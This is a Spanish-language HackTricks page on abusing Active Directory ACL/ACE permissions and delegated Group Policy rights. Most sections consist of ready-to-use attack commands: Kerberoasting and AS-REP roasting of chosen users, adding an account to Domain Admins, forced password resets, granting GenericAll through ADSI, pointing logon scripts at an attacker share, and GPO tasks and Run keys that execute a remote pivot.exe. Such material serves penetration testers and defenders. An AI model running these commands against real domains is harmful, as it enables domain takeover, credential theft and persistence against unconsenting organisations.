# Abuso de Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Esta página es, en su mayoría, un resumen de las técnicas de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **y** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Para más detalles, consulte los artículos originales.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Derechos sobre el Usuario**

Este privilegio le otorga a un atacante el control total sobre una cuenta de usuario objetivo. Una vez que los permisos `GenericAll` se confirman usando el comando `Get-ObjectAcl`, un atacante puede:

- **Cambiar la contraseña del objetivo**: Usando `net user <username> <password> /domain`, el atacante puede restablecer la contraseña del usuario.
- **Targeted Kerberoasting**: Asignar un SPN a la cuenta del usuario para hacerla kerberoastable, luego usar Rubeus y targetedKerberoast.py para extraer e intentar descifrar los hashes del ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deshabilitar la preautenticación para el usuario, haciendo que su cuenta sea vulnerable a ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Permisos GenericAll sobre el grupo**

Este privilegio permite a un atacante manipular las membresías del grupo si tiene derechos `GenericAll` sobre un grupo como `Domain Admins`. Tras identificar el nombre distinguido del grupo con `Get-NetGroup`, el atacante puede:

- **Añadirse al grupo Domain Admins**: Esto se puede hacer mediante comandos directos o usando módulos como Active Directory o PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Desde Linux también puedes usar BloodyAD para añadirte a grupos arbitrarios cuando tienes GenericAll/Write membership sobre ellos. Si el grupo objetivo está anidado en “Remote Management Users”, obtendrás inmediatamente acceso WinRM en hosts que respeten ese grupo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Tener estos privilegios en un objeto computer o en una cuenta de usuario permite:

- **Kerberos Resource-based Constrained Delegation**: Permite apoderarse de un objeto computer.
- **Shadow Credentials**: Usar esta técnica para suplantar a un computer o cuenta de usuario explotando los privilegios para crear Shadow Credentials.

## **WriteProperty on Group**

Si un usuario tiene `WriteProperty` rights on all objects for a specific group (p. ej., `Domain Admins`), puede:

- **Add Themselves to the Domain Admins Group**: Lograble combinando los comandos `net user` y `Add-NetGroupUser`, este método permite la escalada de privilegios dentro del dominio.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group

Este privilegio permite a los atacantes agregarse a sí mismos a grupos específicos, como `Domain Admins`, mediante comandos que manipulan directamente la pertenencia al grupo. El uso de la siguiente secuencia de comandos permite la auto-adición:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilegio similar, esto permite a los atacantes agregarse directamente a grupos modificando las propiedades del grupo si tienen el derecho `WriteProperty` sobre esos grupos. La confirmación y ejecución de este privilegio se realizan con:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Tener el `ExtendedRight` sobre un usuario para `User-Force-Change-Password` permite restablecer contraseñas sin conocer la contraseña actual. La verificación de este derecho y su explotación puede realizarse mediante PowerShell u otras herramientas de línea de comandos, ofreciendo varios métodos para restablecer la contraseña de un usuario, incluyendo sesiones interactivas y one-liners para entornos no interactivos. Los comandos van desde invocaciones sencillas de PowerShell hasta el uso de `rpcclient` en Linux, demostrando la versatilidad de los vectores de ataque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner en Grupo**

Si un atacante descubre que tiene permisos `WriteOwner` sobre un grupo, puede cambiar la propiedad del grupo a sí mismo. Esto es especialmente significativo cuando el grupo en cuestión es `Domain Admins`, ya que cambiar la propiedad permite un control más amplio sobre los atributos del grupo y su membresía. El proceso implica identificar el objeto correcto mediante `Get-ObjectAcl` y luego usar `Set-DomainObjectOwner` para modificar el propietario, ya sea por SID o por nombre.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite en Usuario**

Este permiso permite a un atacante modificar las propiedades del usuario. Específicamente, con acceso `GenericWrite`, el atacante puede cambiar la ruta del script de inicio de sesión de un usuario para ejecutar un script malicioso al iniciar sesión. Esto se logra usando el comando `Set-ADObject` para actualizar la propiedad `scriptpath` del usuario objetivo para que apunte al script del atacante.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Con este privilegio, los atacantes pueden manipular la pertenencia a grupos, como agregarse a sí mismos u a otros usuarios a grupos específicos. Este proceso implica crear un objeto de credencial, usarlo para agregar o quitar usuarios de un grupo y verificar los cambios de pertenencia con comandos de PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Poseer un objeto AD y tener privilegios `WriteDACL` sobre él permite a un atacante otorgarse a sí mismo privilegios `GenericAll` sobre el objeto. Esto se consigue mediante la manipulación de ADSI, lo que permite el control total del objeto y la capacidad de modificar su pertenencia a grupos. No obstante, existen limitaciones al intentar explotar estos privilegios usando los cmdlets `Set-Acl` / `Get-Acl` del módulo Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicación en el dominio (DCSync)**

El ataque DCSync aprovecha permisos de replicación específicos en el dominio para imitar a un Controlador de Dominio y sincronizar datos, incluidas las credenciales de usuario. Esta técnica poderosa requiere permisos como `DS-Replication-Get-Changes`, lo que permite a los atacantes extraer información sensible del entorno AD sin acceso directo a un Controlador de Dominio. [**Aprende más sobre el ataque DCSync aquí.**](../dcsync.md)

## Delegación de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegación de GPO

El acceso delegado para administrar Objetos de directiva de grupo (GPOs) puede presentar riesgos de seguridad significativos. Por ejemplo, si a un usuario como `offense\spotless` se le delegan derechos de gestión de GPO, podría tener privilegios como **WriteProperty**, **WriteDacl** y **WriteOwner**. Estos permisos pueden ser abusados con fines maliciosos, como se identifica usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerar permisos de GPO

Para identificar GPOs mal configurados, los cmdlets de PowerSploit pueden encadenarse. Esto permite descubrir GPOs que un usuario específico puede administrar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Equipos con una política aplicada**: Es posible resolver a qué equipos se aplica un GPO específico, lo que ayuda a entender el alcance del posible impacto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Políticas aplicadas a un equipo dado**: Para ver qué políticas se aplican a un equipo en particular, se pueden utilizar comandos como `Get-DomainGPO`.

**OUs con una política aplicada**: Identificar unidades organizativas (OUs) afectadas por una política dada puede hacerse usando `Get-DomainOU`.

También puedes usar la herramienta [**GPOHound**](https://github.com/cogiceo/GPOHound) para enumerar GPOs y encontrar problemas en ellas.

### Abusar de GPO - New-GPOImmediateTask

Los GPOs mal configurados pueden explotarse para ejecutar código, por ejemplo, creando una tarea programada inmediata. Esto puede hacerse para añadir un usuario al grupo de administradores locales en las máquinas afectadas, elevando significativamente los privilegios:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

El módulo GroupPolicy, si está instalado, permite la creación y vinculación de nuevos GPOs y la configuración de preferencias, como valores del registro, para ejecutar backdoors en los equipos afectados. Este método requiere que el GPO se actualice y que un usuario inicie sesión en el equipo para su ejecución:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse ofrece un método para abusar de GPOs existentes añadiendo tareas o modificando configuraciones sin la necesidad de crear nuevos GPOs. Esta herramienta requiere la modificación de GPOs existentes o el uso de herramientas RSAT para crear nuevas antes de aplicar los cambios:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzar actualización de políticas

Las actualizaciones de GPO suelen producirse aproximadamente cada 90 minutos. Para acelerar este proceso, especialmente tras implementar un cambio, se puede usar el comando `gpupdate /force` en el equipo objetivo para forzar una actualización inmediata de la política. Este comando asegura que cualquier modificación en las GPO se aplique sin esperar al siguiente ciclo de actualización automático.

### Bajo el capó

Al inspeccionar las tareas programadas de una GPO determinada, como la `Misconfigured Policy`, se puede confirmar la adición de tareas como `evilTask`. Estas tareas se crean mediante scripts o herramientas de línea de comandos con el objetivo de modificar el comportamiento del sistema o escalar privilegios.

La estructura de la tarea, como se muestra en el archivo de configuración XML generado por `New-GPOImmediateTask`, detalla las especificaciones de la tarea programada — incluyendo el comando a ejecutar y sus desencadenadores. Este archivo representa cómo se definen y gestionan las tareas programadas dentro de las GPO, proporcionando un método para ejecutar comandos o scripts arbitrarios como parte de la aplicación de políticas.

### Usuarios y grupos

Las GPO también permiten la manipulación de miembros de usuarios y grupos en los sistemas objetivo. Al editar directamente los archivos de política de Usuarios y grupos, los atacantes pueden añadir usuarios a grupos privilegiados, como el grupo local `administrators`. Esto es posible mediante la delegación de permisos de gestión de GPO, que permite la modificación de los archivos de política para incluir nuevos usuarios o cambiar membresías de grupos.

El archivo de configuración XML para Usuarios y grupos describe cómo se implementan estos cambios. Al añadir entradas a este archivo, se puede otorgar privilegios elevados a usuarios específicos en los sistemas afectados. Este método ofrece un enfoque directo para la escalada de privilegios mediante la manipulación de GPO.

Además, se pueden considerar métodos adicionales para ejecutar código o mantener persistencia, como aprovechar scripts de inicio/cierre de sesión, modificar claves del registro para autoruns, instalar software mediante archivos .msi o editar configuraciones de servicios. Estas técnicas proporcionan diversas vías para mantener acceso y controlar sistemas objetivo mediante el abuso de GPO.

## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
